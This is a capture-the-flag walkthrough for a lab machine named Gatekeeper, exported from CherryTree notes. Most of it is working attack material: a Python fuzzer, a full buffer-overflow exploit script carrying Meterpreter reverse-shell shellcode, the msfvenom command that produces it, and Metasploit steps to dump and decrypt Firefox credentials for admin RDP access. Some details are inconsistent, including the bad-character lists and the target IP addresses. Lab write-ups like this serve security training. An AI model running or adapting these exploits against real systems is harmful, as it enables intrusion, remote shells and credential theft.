<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>gatekeeper</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>gatekeeper</h1><br/><p><strong>Gatekeeper</strong></p><p></p><p>Nmap shows 2 intresting ports.</p><p></p><p>445 : Samba share</p><p>It has anonymous access, login without any username and any password.</p><p></p><p>Under the share <strong>User</strong>, there is a folder named <strong>share</strong> which has the <strong>gatekeeper.exe</strong> application.</p><p>Download it and run it in local windows machine for reverse engineering.</p><p></p><p></p><p>Finding offset is same as earlier.</p><p><strong><span style="text-decoration:underline;">Use following code.</span></strong></p><p></p><p>#!/usr/bin/env python3</p><p></p><p>import socket, time, sys</p><p></p><p>ip = &quot;11.11.11.123&quot;</p><p></p><p>port = 31337</p><p>timeout = 5</p><p></p><p>prefix = &quot;&quot;</p><p>string = prefix + &quot;A&quot; * 100</p><p></p><p>while True:</p><p>  try:</p><p>    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</p><p>      s.settimeout(timeout)</p><p>      s.connect((ip, port))</p><p>      s.recv(1024)</p><p>      print(&quot;Fuzzing Gatekeeper with {} bytes&quot;.format(len(string) - len(prefix)))</p><p>      s.send(bytes(string, &quot;latin-1&quot;))</p><p>      s.recv(1024)</p><p>  except:</p><p>    print(&quot;Fuzzing crashed at {} bytes&quot;.format(len(string) - len(prefix)))</p><p>    sys.exit(0)</p><p>  string += 100 * &quot;A&quot;</p><p>  time.sleep(1)</p><p>  </p><p>  </p><p><strong>  Offset found : 146</strong></p><p>  </p><p>  Then finding the <strong>badchars</strong>, there is a possbile <strong>bug</strong> which keeps on showing badchar as <strong>\x00\x01\x02\x03</strong> and so on.</p><p>  Taken from internet: actual badchars : <strong>/x01/x0a</strong></p><p>  </p><p>  Find jump address, put it in retn.</p><p>  </p><p> Create a meterpreter payload, as we will need certain post exploits for privilege escalation.</p><p> </p><p> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.72.31 LPORT=7777 EXITFUNC=thread -b &quot;\x00\x0a&quot; -f c</p><p> </p><p><strong><span style="text-decoration:underline;">Use the code below:</span></strong></p><p></p><p>#!/usr/bin/env python3</p><p>#Badchars Considered:&quot;\x00\x0a&quot;</p><p>import socket, time, sys</p><p></p><p>ip = &quot;10.10.56.226&quot;</p><p>port = 31337</p><p>timeout = 5</p><p></p><p>prefix = &quot;&quot;</p><p></p><p>offset = 146</p><p>overflow = &quot;A&quot; * offset</p><p>retn = &quot;\xbf\x16\x04\x08&quot;</p><p>padding = &quot;\x90&quot; * 10</p><p></p><p>payload = (&quot;\xda\xdb\xd9\x74\x24\xf4\xb8\x1c\x1f\x48\xa5\x5e\x31\xc9\xb1&quot;</p><p>&quot;\x5e\x31\x46\x1a\x83\xee\xfc\x03\x46\x16\xe2\xe9\xe3\xa0\x2a&quot;</p><p>&quot;\x11\x1c\x31\x55\x20\xce\xb8\x70\x26\x65\xe8\x4a\x2d\x2b\x01&quot;</p><p>&quot;\x20\x63\xd8\x28\xc9\x08\x92\x62\x3a\xb9\x19\x55\x75\x05\x31&quot;</p><p>&quot;\xa5\x14\xf9\x48\xfa\xf6\xc0\x82\x0f\xf6\x05\x55\x65\x17\xdb&quot;</p><p>&quot;\x31\x0e\xb5\xcb\x36\x52\x06\xea\x98\xd8\x36\x94\x9d\x1f\xc2&quot;</p><p>&quot;\x28\x9f\x4f\xa0\xf8\x87\xe4\xef\xd8\xe7\xfb\xdc\x9d\xc1\x88&quot;</p><p>&quot;\xde\xd4\x5a\x44\x94\xe7\x8a\x94\x55\xd6\xf2\x16\x66\x15\x5f&quot;</p><p>&quot;\x99\xbe\x1d\x7f\xef\xb4\x5e\x02\xe8\x0e\x1d\xd8\x7d\x91\x85&quot;</p><p>&quot;\xab\x26\x75\x34\x7f\xb0\xfe\x3a\x34\xb6\x59\x5e\xcb\x1b\xd2&quot;</p><p>&quot;\x5a\x40\x9a\x35\xeb\x12\xb9\x91\xb0\xc1\xa0\x80\x1c\xa7\xdd&quot;</p><p>&quot;\xd3\xf8\x18\x78\x9f\xea\x4f\xfc\x60\xf5\x6f\xa0\xf6\x3a\xa2&quot;</p><p>&quot;\x5b\x07\x54\xb5\x28\x35\xfb\x6d\xa7\x75\x74\xa8\x30\x0f\x92&quot;</p><p>&quot;\x4b\xee\xb7\xf2\xb5\x0f\xc8\xdb\x71\x5b\x98\x73\x53\xe4\x73&quot;</p><p>&quot;\x83\x5c\x31\xe9\x89\xca\xb0\xe5\xc5\x15\xad\xfb\xd5\x37\x4c&quot;</p><p>&quot;\x75\x33\x17\xde\xd5\xeb\xd8\x8e\x95\x5b\xb1\xc4\x19\x84\xa1&quot;</p><p>&quot;\xe6\xf3\xad\x48\x09\xaa\x86\xe4\xb0\xf7\x5c\x94\x3d\x22\x19&quot;</p><p>&quot;\x96\xb6\xc7\xde\x59\x3f\xad\xcc\x8e\x58\x4d\x0c\x4f\xcd\x4d&quot;</p><p>&quot;\x66\x4b\x47\x19\x1e\x51\xbe\x6d\x81\xaa\x95\xed\xc5\x55\x68&quot;</p><p>&quot;\xc4\xbe\x60\xfe\x68\xa8\x8c\xee\x68\x28\xdb\x64\x69\x40\xbb&quot;</p><p>&quot;\xdc\x3a\x75\xc4\xc8\x2e\x26\x51\xf3\x06\x9b\xf2\x9b\xa4\xc2&quot;</p><p>&quot;\x35\x04\x56\x21\x46\x43\xa8\xb4\x61\xec\xc1\x46\x32\x0c\x12&quot;</p><p>&quot;\x2c\xb2\x5c\x7a\xbb\x9d\x53\x4a\x44\x34\x3c\xc2\xcf\xd9\x8e&quot;</p><p>&quot;\x73\xd0\xf3\x4f\x2a\xd1\xf0\x4b\xdd\xa8\x79\x6b\x1e\x4d\x90&quot;</p><p>&quot;\x08\x1e\x4e\x9c\x2e\x22\x99\xa5\x44\x65\x1a\x92\x47\x78\xb6&quot;</p><p>&quot;\xef\xef\x25\x53\x52\x72\xd6\x8e\x91\x8b\x55\x3a\x6a\x68\x45&quot;</p><p>&quot;\x4f\x6f\x34\xc1\xbc\x1d\x25\xa4\xc2\xb2\x46\xed&quot;)</p><p>postfix = &quot;&quot;</p><p></p><p></p><p></p><p>string = overflow + retn + padding + payload</p><p></p><p>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p><p></p><p>try:</p><p>  s.connect((ip, port))</p><p>  print(&quot;Delivering Payload into Gatekeeper.&quot;)</p><p>  #s.send(bytes(username, &quot;latin-1&quot;))</p><p>  time.sleep(1)</p><p>  s.send(bytes(string + &quot;\r\n&quot;, &quot;latin-1&quot;))</p><p>  print(&quot;Done!&quot;)</p><p></p><p>except:</p><p>  print(&quot;Could not connect.&quot;)</p><p></p><p></p><p>Start a multi handler in msfconsole</p><p>Run the exploit to get <strong>session</strong>.</p><p>Get the user flag in the desktop of the user.</p><p></p><p></p><p><strong>Privilege escalation</strong></p><p></p><p>We find the firefox is running on the target machine.</p><p>We use a msfconsole post exploit tool to dump the credentials.</p><p></p><p>use post/multi/gather/firefox_creds</p><p></p><p>Give session id as option</p><p></p><p>run</p><p></p><p></p><p>We will get the files in loot folder.</p><p><img src="images/15-1.png" alt="images/15-1.png" /></p><p></p><p>Now go to the locations of loot and copy/move the files with their actual names.</p><p>After move/copy the following should be the contents.</p><p><img src="images/15-2.png" alt="images/15-2.png" /></p><p></p><p>Then get the <strong>firefox_decrypt</strong> from github. <strong>https://github.com/unode/firefox_decrypt</strong></p><p></p><p>Then run it inside the dump folder using.</p><p></p><p><strong>python /opt/firefox_decrypt/firefox_decrypt.py .</strong></p><p></p><p></p><p><img src="images/15-3.png" alt="images/15-3.png" /></p><p></p><p>As we can see, we got username and password. Its actually admin user.</p><p>We can rdp into the machine using the above credentials and get the root flag.</p><p></p><p><strong>Note:</strong> </p><p>The initial program exploitation into shell is not given in this guide. But is same as the brainstorm and training link mentioned below</p><p>For detailed explanation about offset finding and exploiting the app is explained in details in &quot;<strong>CybeXRay Guides -----→ Reverse Engineering -----→ Buffer Overflows Using ID &amp; mona</strong>&quot;</p><p></p></div>
</body>
</html>
